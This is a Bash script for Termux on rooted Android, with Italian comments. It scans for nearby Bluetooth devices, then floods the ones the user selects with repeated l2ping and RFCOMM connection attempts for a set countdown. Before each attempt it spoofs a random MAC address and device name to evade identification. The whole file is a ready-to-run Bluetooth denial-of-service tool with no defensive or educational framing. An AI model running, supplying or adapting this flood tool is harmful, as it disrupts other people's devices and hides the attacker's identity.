#!/data/data/com.termux/files/usr/bin/bash

# Colori
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Verifica root
if [[ "$(id -u)" -ne 0 ]]; then
  echo -e "${RED}[!] Devi eseguire come root (su)${NC}"
  exit 1
fi

# Funzione: spoof MAC + nome
spoof_identity() {
  rand_mac="02:11:22:$(hexdump -n3 -e '/1 ":%02X"' /dev/urandom)"
  rand_name="BT_$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 6 | head -n1)"
  
  hciconfig hci0 down
  bdaddr -i hci0 $rand_mac
  hciconfig hci0 name $rand_name
  hciconfig hci0 up
  
  echo -e "${YELLOW}[*] Identità spoofata: ${rand_name} - ${rand_mac}${NC}"
}

# Funzione: scan dispositivi
scan_devices() {
  echo -e "${YELLOW}[*] Scansione dispositivi Bluetooth...${NC}"
  timeout 10s hcitool scan > /tmp/scan.txt
  devices=()
  while IFS= read -r line; do
    mac=$(echo "$line" | awk '{print $1}')
    name=$(echo "$line" | cut -d ' ' -f 2-)
    devices+=("$mac|$name")
  done < <(tail -n +2 /tmp/scan.txt)
  
  echo -e "${YELLOW}Dispositivi trovati:${NC}"
  for i in "${!devices[@]}"; do
    IFS="|" read mac name <<< "${devices[$i]}"
    echo "[$i] $name - $mac"
  done
}

# Funzione: flood verso un singolo target
flood_loop() {
  local target="$1"
  local seconds="$2"
  local end=$((SECONDS + seconds))

  while [ $SECONDS -lt $end ]; do
    spoof_identity
    l2ping -c 1 "$target" > /dev/null 2>&1 && \
      echo -e "${GREEN}[L2PING] Riuscito verso $target${NC}" || \
      echo -e "${RED}[L2PING] Fallito verso $target${NC}"

    timeout 2s rfcomm connect hci0 "$target" 1 > /dev/null 2>&1 && \
      echo -e "${GREEN}[RFCOMM] Connessione tentata $target${NC}" || \
      echo -e "${RED}[RFCOMM] RFCOMM fallita $target${NC}"
    
    sleep 0.3
  done
}

# MAIN
scan_devices

read -p "Inserisci gli index separati da spazio dei target (es: 0 2 3): " -a selected

read -p "Digita il comando /flood <countdown_in_secondi>: " cmd dur
if [[ "$cmd" != "/flood" ]] || ! [[ "$dur" =~ ^[0-9]+$ ]]; then
  echo -e "${RED}[!] Comando non valido. Usa: /flood <secondi>${NC}"
  exit 1
fi

# Avvio flood per ogni target in background
for i in "${selected[@]}"; do
  IFS="|" read mac name <<< "${devices[$i]}"
  echo -e "${YELLOW}[*] Flood su $name ($mac) per $dur secondi...${NC}"
  flood_loop "$mac" "$dur" &
done

wait
echo -e "${GREEN}[*] Flood terminato per tutti i target.${NC}"
